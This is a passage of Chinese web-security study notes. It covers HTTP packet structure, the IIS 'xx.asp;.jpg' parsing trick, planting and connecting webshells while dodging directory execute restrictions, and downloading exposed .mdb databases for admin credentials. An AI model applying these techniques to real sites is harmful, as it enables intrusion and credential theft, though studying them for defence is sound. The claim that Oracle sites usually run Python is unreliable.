+<p><img src="/2022/07/21/xiaodi/image-20220724173613276.png" alt="image-20220724173613276"></p>
+<p>Referer代表产生请求的网页，如果是在该网站访问该网站的链接，那referer可能为空，如果是从其他网站请求访问，就会在referer处显示网站url</p>
+<p>一些网站可能会验证referer判断是否可能是从其他网站来的，保护用户账号安全，避免用户cookie被盗用，也就是csrf漏洞</p>
+<p><img src="/2022/07/21/xiaodi/image-20220724175117961.png" alt="image-20220724175117961"></p>
+<h4 id="3-空行和请求体"><a href="#3-空行和请求体" class="headerlink" title="3.空行和请求体"></a>3.空行和请求体</h4><p><img src="/2022/07/21/xiaodi/image-20220724211529241.png" alt="image-20220724211529241"></p>
+<p>空行和请求体可以看看下面这个例子</p>
+<p><img src="/2022/07/21/xiaodi/image-20220724203919573.png" alt="image-20220724203919573"></p>
+<p>可以看到请求体是<code>id=1&amp;submit=%E6%9F%A5%E8%AF%A2</code>而其上面就是和请求头分开的空行</p>
+<p><img src="/2022/07/21/xiaodi/image-20220724203945852.png" alt="image-20220724203945852"></p>
+<h3 id="4-response返回数据包"><a href="#4-response返回数据包" class="headerlink" title="4.response返回数据包"></a>4.response返回数据包</h3><p><img src="/2022/07/21/xiaodi/image-20220724213601900.png" alt="image-20220724213601900"></p>
+<p><u><strong>HTTP响应码（状态码）</strong></u></p>
+<p><img src="/2022/07/21/xiaodi/image-20220723215355113.png" alt="image-20220723215355113"></p>
+<h4 id="1-状态行"><a href="#1-状态行" class="headerlink" title="1.状态行"></a>1.状态行</h4><p>下例<strong>状态代码</strong>：200  || <strong>协议版本</strong>：HTTP&#x2F;1.1 ||   <strong>状态描述</strong>：OK</p>
+<p><img src="/2022/07/21/xiaodi/image-20220724222056594.png" alt="image-20220724222056594"></p>
+<h4 id="2-响应头标"><a href="#2-响应头标" class="headerlink" title="2.响应头标"></a>2.响应头标</h4><p>上图除了第一行以外就是响应头标，类似请求头</p>
+<h4 id="3-空行"><a href="#3-空行" class="headerlink" title="3.空行"></a>3.空行</h4><p>在响应头标和响应数据之间，表示响应头标的结束</p>
+<h4 id="4-响应数据"><a href="#4-响应数据" class="headerlink" title="4.响应数据"></a>4.响应数据</h4><p><strong>响应数据</strong>就是当前页面的源代码</p>
+<p><img src="/2022/07/21/xiaodi/image-20220724222442836.png" alt="image-20220724222442836"></p>
+<hr>
+<h2 id="DAY3-基础入门-搭建安全拓展"><a href="#DAY3-基础入门-搭建安全拓展" class="headerlink" title="DAY3 基础入门-搭建安全拓展"></a>DAY3 基础入门-搭建安全拓展</h2><h3 id="1-常见搭建平台脚本启用"><a href="#1-常见搭建平台脚本启用" class="headerlink" title="1.常见搭建平台脚本启用"></a>1.常见搭建平台脚本启用</h3><p><img src="/2022/07/21/xiaodi/image-20220725230825776.png" alt="image-20220725230825776"></p>
+<h3 id="2-域名IP目录解析安全问题"><a href="#2-域名IP目录解析安全问题" class="headerlink" title="2.域名IP目录解析安全问题"></a>2.域名IP目录解析安全问题</h3><p><strong>域名访问</strong>时（如<code>www.baidu.com</code>）一般是<strong>指向某个特定文件</strong>，用工具扫描时，也只能扫描该目录下的文件</p>
+<p><strong>IP访问</strong>时就可以<strong>访问到根目录</strong>，扫描时就可能扫描到该站点下的所有文件，甚至还有网站源码备份文件</p>
+<p><u>一般是IP和域名同时使用</u></p>
+<h3 id="3-常见文件后缀解析对应安全"><a href="#3-常见文件后缀解析对应安全" class="headerlink" title="3.常见文件后缀解析对应安全"></a>3.常见文件后缀解析对应安全</h3><p><img src="/2022/07/21/xiaodi/image-20220725210703706.png" alt="image-20220725210703706"></p>
+<p>下图是，iis中间件</p>
+<p>扩展名对应配置文件，使得有该扩展名的文件以配置文件定义的方式打开或运行</p>
+<p>如，添加一个扩展名为.haha，对应的配置文件就为下图的.asp扩展名对应的配置文件，这样打开.haha扩展名的文件就相当于打开.asp类型的文件了</p>
+<p>所以，利用这个有时候我们上传以为正确的文件扩展名，但却无法以我们想要的方式打开或者用蚁剑、菜刀等工具连接，就可能是中间件解析协议修改了本来的扩展名</p>
+<p>如删除了.asp，只保留.haha扩展名，如果上传.asp扩展名文件，就会无效，使得我们受阻，只有上传.haha扩展名文件才可以被视为asp文件</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">这里做个补充，，之前做过一个“内部文件上传系统漏洞分析溯源”的题，提到了iis低版本解析漏洞</span><br><span class="line"></span><br><span class="line">IIS解析漏洞分为两种：</span><br><span class="line">（1）一种是在以“<span class="string">.asp</span>”“<span class="string">.asa</span>”命名的文件夹内，所有文件都以asp文件被解析。</span><br><span class="line">（2）第二种是IIS的文件解析,形式：<span class="string">/xx.asp</span>;<span class="string">.jpg</span>（利⽤特殊符号 <span class="string">&quot;;&quot;</span><span class="string">.xx.asp</span>;<span class="string">.jpg</span> 被解析为asp脚本</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/21/xiaodi/image-20220725223658222.png" alt="image-20220725223658222"></p>
+<h3 id="4-常见安全测试中的安全防护"><a href="#4-常见安全测试中的安全防护" class="headerlink" title="4.常见安全测试中的安全防护"></a>4.常见安全测试中的安全防护</h3><h4 id="1-拒绝匿名访问"><a href="#1-拒绝匿名访问" class="headerlink" title="1.拒绝匿名访问"></a>1.拒绝匿名访问</h4><p>这样想要访问网站页面的时候，就需要输入限定账号和密码，否则就无法进行访问</p>
+<h4 id="2-拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）"><a href="#2-拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）" class="headerlink" title="2.拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）"></a>2.拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）</h4><p>通过添加对方IP，来实现在IP内的所有计算机网络都无法访问该网站</p>
+<h3 id="5-WEB后门与用户及文件权限"><a href="#5-WEB后门与用户及文件权限" class="headerlink" title="5.WEB后门与用户及文件权限"></a>5.WEB后门与用户及文件权限</h3><p>利用菜刀等工具，可以连接到服务器中的后门，但是如果服务器端设置了对Internet 来宾用户的权限时，就会遇到阻碍</p>
+<p>如设置拒绝读取，那么菜刀就无法读取该文件夹下的内容，就在前面提到网站的拒绝匿名访问</p>
+<p>如果设置拒绝写入，那么菜刀就无法在其中新建文件</p>
+<p>但是该网站这个目录下的网站页面，也无法正常访问</p>
+<p><img src="/2022/07/21/xiaodi/image-20220726110555183.png" alt="image-20220726110555183"></p>
+<p>下图为网站不给执行权限，也就是里面的文件都无法执行，这样无论是访问我们上传的木马，还是菜刀试着连接木马，都不行，以因为没有了执行权限，那么我们写的一句话木马的代码也发挥不了作用</p>
+<p>这也是实战中为什么会这么困难和复杂</p>
+<p><u><strong>那么一般如何解决这个问题呢？</strong></u></p>
+<p>我们可以试试换一个目录，一般这种限制最可能在例如upload这种目录，但是img这类图片目录下，常理而言是没有脚本文件，所以很有可能是没有加以限制的，所以在上传文件的时候，可以试试抓包然后修改文件上传的目录，从而使得脚本可以正常执行和与工具连接</p>
+<p>一般思路就是把脚本文件努力上传到最可能没有限制的目录下，比如<u>根目录</u>，或者<u>网站自身的脚本目录</u>（因为它自身可能也需要运行它自己的脚本，所以大概率不可能在那个目录下加上权限，这样它自己也无法正常运行了）</p>
+<p><img src="/2022/07/21/xiaodi/image-20220726110523557.png" alt="image-20220726110523557"></p>
+<h3 id="6-网站源码脚本格式"><a href="#6-网站源码脚本格式" class="headerlink" title="6.网站源码脚本格式"></a>6.网站源码脚本格式</h3><p><code>一般可以根据数据库类型，或者网站搭建的中间件平台加以推导</code></p>
+<h4 id="1-知道数据库类型"><a href="#1-知道数据库类型" class="headerlink" title="1.知道数据库类型"></a>1.知道数据库类型</h4><p>mysql数据库一般是php脚本</p>
+<p>sqlserver数据库一般是asp或aspx脚本</p>
+<p>oracle数据库一般是python脚本</p>
+<h4 id="2-知道中间件"><a href="#2-知道中间件" class="headerlink" title="2.知道中间件"></a>2.知道中间件</h4><p>iis一般用asp或aspx</p>
+<p>apache一般php脚本居多</p>
+<p>tomcat一般jsp脚本</p>
+<p>如果判断不出网站的源码脚本文件，</p>
+<p>可能网站做了伪静态，那么在脚本类型不会在网站地址下去体现，但是用<u><strong>扫描工具</strong></u>可以更加深入的爬寻文件</p>
+<p>还有一个方法就是在<u><strong>谷歌搜索引擎</strong></u>上看看有没有该网站的快照信息，有快照信息就可以针对性的用关键词筛选一下，看有没有脚本运行信息出现</p>
+<p>还有就是可以<u><strong>抓网站的数据包</strong></u>，看看数据包里，一般的如果数据包的写法不同，里面的cookie值就会有所不同，比如phpsession,jspsession，就可以根据前缀知道是什么类型的脚本文件 ，如果都不是可能就是asp或aspx</p>
+<hr>
+<h2 id="DAY4-基础入门-WEB源码拓展"><a href="#DAY4-基础入门-WEB源码拓展" class="headerlink" title="DAY4 基础入门-WEB源码拓展"></a>DAY4 基础入门-WEB源码拓展</h2><p><img src="/2022/07/21/xiaodi/image-20220727150617311.png" alt="image-20220727150617311"></p>
+<p><img src="/2022/07/21/xiaodi/image-20220727150829672.png" alt="image-20220727150829672"></p>
+<h3 id="1-网站源码文件目录"><a href="#1-网站源码文件目录" class="headerlink" title="1.网站源码文件目录"></a>1.网站源码文件目录</h3><p><code>admin</code>：后台文件目录</p>
+<p><code>data</code>：数据相关，可能有数据库配置文件【可能直接连接到对方的数据库获得对方的数据库信息】</p>
+<p><code>include</code>：数据库目录</p>
+<p><code>template</code>：网站模板文件,和网站界面相关，优化网站架构【(艹皿艹 )想起学ssti漏洞，看了好几天文章】</p>
+<h3 id="2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"><a href="#2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题" class="headerlink" title="2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"></a>2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题</h3><p>可以在这个网站上看看脚本语言类型</p>
+<p><code>https://websec.readthedocs.io/zh/latest/language/index.html</code></p>
+<p>当看到网站的脚本格式时，就大致可以猜测到大概容易出现什么漏洞，</p>
+<p>因为网站源码语言和应用不同，编写的方式也不同，出现的问题也就不同，从而针对性的寻找或修复漏洞，节约时间，提高效率</p>
+<h3 id="3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"><a href="#3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞" class="headerlink" title="3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"></a>3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞</h3><h3 id="4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"><a href="#4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等" class="headerlink" title="4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"></a>4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</h3><p>CMS：内容管理系统（content management system，CMS），是一种位于WEB前端（Web  服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、<a href="https://baike.baidu.com/item/Intranet/3247037">Intranet</a>以及<a href="https://baike.baidu.com/item/Extranet/10579301">Extranet</a>网站的信息。</p>
+<h3 id="5-关于源码获取相关途径"><a href="#5-关于源码获取相关途径" class="headerlink" title="5.关于源码获取相关途径"></a>5.关于源码获取相关途径</h3><p>搜索，咸鱼淘宝，第三方源码站，各种行业对应，一些源码可能就可以找到源码，但一般是大众型的，而一些小型（或者灰色的网站）网站可能搜不到的，咸鱼等一些第三方源码可能找到的</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="#总结"></a>#总结</h3><p>关注应用分类及脚本类型估摸出可能存在的漏洞(其中框架类例外)，在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理(数据库备份，bak文件等)，未获取到的源码采用各种方法想办法获取!</p>
+<hr>
+<h3 id="asp网站"><a href="#asp网站" class="headerlink" title="asp网站"></a>asp网站</h3><p>有一个<code>mdb</code>文件【表格文件】，存放数据，相当于数据库，后台的账号密码一般在上面</p>
+<p>如果网站是直接套用的网站源码结构，没有进行修改，其中就包括数据库路径，那么我们就可以尝试把数据库的路径防止物联网网上尝试下载【一般是进行过滤了，几乎不可能下载成功】，</p>
+<p>比如知道<code>www.hahaha.com</code>这个网站的数据库在<code>/admin/schema/</code>这个路径里，数据库文件名为<code>flag.mdb</code></p>
+<p>那我们访问<code>www.hahaha.com/admin/schema/flag.mdb</code>就可能下载下来数据库文件，查看里面的后台的账号和密码【密码一般加密了的(md5)】</p>
+<h3 id="php网站"><a href="#php网站" class="headerlink" title="php网站"></a>php网站</h3>]]></content>
+      <categories>
+        <category>网络安全学习</category>
+      </categories>
+      <tags>
+        <tag>视频学习记录</tag>
       </tags>
   </entry>
   <entry>
